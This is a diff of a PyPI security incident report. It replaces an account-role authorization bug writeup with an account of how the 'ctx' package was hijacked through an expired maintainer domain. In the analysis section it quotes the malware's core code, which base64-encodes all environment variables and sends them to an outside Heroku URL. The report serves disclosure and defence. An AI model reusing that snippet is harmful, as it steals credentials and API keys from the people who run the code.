@@ -2,14 +2,23 @@
 Account Takeover and Malicious Replacement of ctx Project
 =========================================================
 
-The ``ctx`` hosted project on PyPI was takend over via user account compromise
+Summary
+=======
+
+The ``ctx`` hosted project on PyPI was taken over via user account compromise
 and replaced with a malicious project which contained runtime code which
 collected the content of ``os.environ.items()``` when instantiating ``Ctx``
 objects. The captured environment variables were sent as a base64 encoded query
-parameter to a heroku application runnig at ``https://anti-theft-web.herokuapp.com``.
+parameter to a heroku application running at ``https://anti-theft-web.herokuapp.com``.
 
 Between 2022-05-14T19:18:36Z and 2022-05-24T10:07:17Z the following release
-files were hosted by PyPI at various times containing this malicious payload:
+below files were hosted by PyPI at various times containing this malicious
+payload
+
+If you installed the package between May 14, 2022 and May 24, 2022, and your
+environment variables contain sensitive data like passwords and API keys (like
+AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY), we advise you rotate your
+passwords and keys, then perform an audit to determine if they were exploited.
 
 +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------+------------------------------------------------------------------+
 | File                                                                                                                                                                                       | Upload Time              | sha 256 digest                                                   |
@@ -61,66 +70,125 @@ The original and sole releases prior to the compromise are still available as:
 | `ctx-0.1.2.tar.gz <https://files.pythonhosted.org/packages/48/aa/94bc2fdfe7a524cde4275c115bcc0185e6a58fde460568c513242b314b73/ctx-0.1.2.tar.gz>`_                                          | 2014-12-19T07:31:04.062Z | edbff45647936da3cdadcfeaa64ee9f62b8ad629a5cea8caa4b63f5dc08b99c4 |
 +--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------+------------------------------------------------------------------+
 
-* Disclosure date: **2022-05-24** (Reported via security policy on `pypi.org <https://pypi.org/security/>`_)
-* Disclosed by: `RyotaK <https://twitter.com/ryotkak>`_
-* Bounty awarded to discloser: $1,000 USD for multiple reports in 2021-07
+* Disclosure date: **2022-05-24** (Response initiated via reports submitted via security policy on `pypi.org <https://pypi.org/security/>`_)
+* Disclosed by: Multiple Parties
 
-Summary
-=======
 
-PyPI has two types of permissions for users relative to projects: ``Owner`` and
-``Maintainer``. Permissions are stored by mapping a user ID to a project ID,
-with a permission, as a role. Each role has a unique ID.
+Analysis and Mitigation
+=======================
 
-PyPI users have the ability to remove roles for the projects they have the
-``Owner`` role for. This is done via a web form by ``POST``-ing the role ID to
-an endpoint dedicated to deleting roles.
+Once notified, a PyPI administrator confirmed that all current releases on the
+index contained a similar exfiltration mechanism in the contents of the
+``ctx.py`` file of the release files::
 
-This endpoint is guarded by a permissions check to ensure the current user has
-the ``Owner`` role on the current project. However, when querying for the role
-by ID, the query was missing a check that the current project matches the
-project the role is associated with.
+    class Ctx(dict):
 
-This would enable any user to delete any role if they were able to procure a
-valid role ID.
+        def __init__(self):
 
-Analysis
-========
+            self.sendRequest()
 
-Role IDs are represented on PyPI as UUIDs, and are therefore pseudo-random and
-not enumerable. In addition, role IDs for a given project are only exposed to
-any user with the ``Owner`` role on that project (via the same webform for
-deleting roles).
+        def sendRequest(self):
+            string = ""
+            for _, value in os.environ.items():
+                string += value+" "
 
-Given this, the PyPI administrators determined that it would not be possible
-for an attacker to acquire a role ID that they didn't already have the ability
-to delete, and that any successful exploitation of this vulnerability would
-require a high volume of requests in attempt to brute force a role ID. In
-addition, any successful exploitation would only have the ability to remove a
-random role ID, and not a role for a specific user or project.
+            message_bytes = string.encode('ascii')
+            base64_bytes = base64.b64encode(message_bytes)
+            base64_message = base64_bytes.decode('ascii')
 
-Mitigation
-==========
+            response = requests.get("https://anti-theft-web.herokuapp.com/hacked/"+base64_message)
 
-This vulnerability was fixed in https://github.com/pypa/warehouse/pull/9845 via
-https://github.com/pypa/warehouse/pull/9845/commits/7605bee1e77319000f71f5b60959a35c8e482161
-by adding a filter on the current project to the query for the role.
+**Note:** Above code is reduced to core mechanism for clarity.
 
-Audit
-=====
+With the malicious nature of all release files confirmed, the PyPI
+administrator used existing tools to:
 
-The PyPI administrators analyzed incidences of high-volume traffic to the role
-deletion endpoint, and found two days where the quantity of requests to this
-endpoint were far above average (>200 requests per day). The PyPI
-administrators analyzed all role deletions on these days and found them to be
-legitimate bulk removals of roles.
+* Remove the project, all releases, and all release files from the index
+* Simultaneously prohibit the name ``ctx`` from being re-registered without
+  admin intervention
+* Freeze the compromised user account of the owner
+
+The activity log of the user, action log on the project, metadata for all
+historical uploads---including malicious---, archives of the files, and their
+locations in object storage were backed up for further analysis.
+
+WHOIS records were then queried to confirm that the domain associated with the
+owner user account had been recently registered on 2022-05-14T18:40:05Z.
+Activity logs for the owner user account were then used to confirm that
+malicious activity including password reset and uploads commenced just 12
+minutes after domain registration. No mechanism for multi factor authentication
+was enabled for the owner user account.
+
+The PyPI administrators made the decision *not* to restore the original files
+at this time, as PyPI policies state that actions on the index including
+deletion are immutable.
+
+If there is sufficient reason to restore the removed files a process that
+complies with that contract will need to be developed.
+
+
+Impact Assessment
+=================
+
+The ``ctx`` project was registered and uploaded to PyPI in 2014. According to
+Libraries.io, the project on PyPI that declares it as a dependency is
+``context-engine``. No known repositories that Libraries.io analyzes declares
+``ctx`` as a dependency.
+
+Before the malicious releases were uploaded, ``ctx`` saw on average 1600
+downloads per day. After malicious releases were uploaded, downloads rose to a
+peak of 4548 on 2022-05-20. Rises like these are common after new project
+releases due to mirrors of PyPI syncing in new changes.
+
+In total we estimate that 27,000 malicious versions of this project were
+downloaded from PyPI, with the majority of "overage" downloads being driven by
+mirrors.
+
+This hypothesis is supported by data from analysis of requests to
+https://pypi.org/simple/ctx/ showing no associated rise in simple traffic from
+installers.
+
+.. image:: ./2022-05-24-ctx-domain-takeover-chart.png
+   :width: 400
+   :alt: Chart showing simple request and download counts for ctx project on pypi
+
+Potential Future Mitigation
+===========================
+
+Domain takeovers are a known attack vector for compromising individual user
+accounts on PyPI. PyPI administrators have responded to reports in the past of
+publicly visible email addresses associated with project metadata containing
+expired domains, which happened to match the domains of owner user accounts for
+projects.
+
+Performing this analysis on an ongoing basis and freezing accounts with expired
+or near expiration domains is a potential mitigation that could protect absent
+maintainers in the future, at the cost of increased support burden on the team
+of PyPI moderators and admins.
+
+Further Reccomendations
+=======================
+
+We also advise PyPI users to enable multi factor authentication on their PyPI
+accounts following the references at https://pypi.org/help/#twofa
+
+The safety and pip-audit projects can be used to check for known
+vulnerabilities in your dependencies:
+
+* https://github.com/pyupio/safety
+* https://github.com/trailofbits/pip-audit
+
+You can join the security-sig mailing list to discuss Python security:
+https://mail.python.org/mailman3/lists/security-sig.python.org/
 
 Timeline
 ========
 
-* 2018-01-22: "Role management" feature added in (PR #2705)
-* 2021-07-26: Issue reported by `RyotaK <https://twitter.com/ryotkak>`_
-  following guidelines in security policy on `pypi.org
-  <https://pypi.org/security/>`_)
-* 2021-07-27 (**+1days**): Fix is implemented and deployed in `commit 7605be
-  <https://github.com/pypa/warehouse/pull/9845/commits/7605bee1e77319000f71f5b60959a35c8e482161>`_
+* Unknown: Domain hosting email for ``ctx`` owner user account expired
+* 2022-05-10: Password reset attempted for ``ctx`` owner user account
+* 2022-05-14T18:40:05Z: Domain associated with ``ctx`` owner user account registered
+* 2022-05-14T18:52:40Z: ``ctx`` owner user account password successfully reset
+* 2022-05-14T19:18:36Z - 2022-05-21T12:41:57Z: Malicious versions of ``ctx`` project uploaded
+* 2022-05-21T12:50:23.107588: Original benign versions of ``ctx`` removed from index
+* 2022-05-24: Reports of project takeover submitted on multiple channels including security@python.org
+* 2022-05-24T10:07:17Z: All malicious releases of ``ctx`` project removed from index, project name prohibited from re-registration, and owner user account frozen
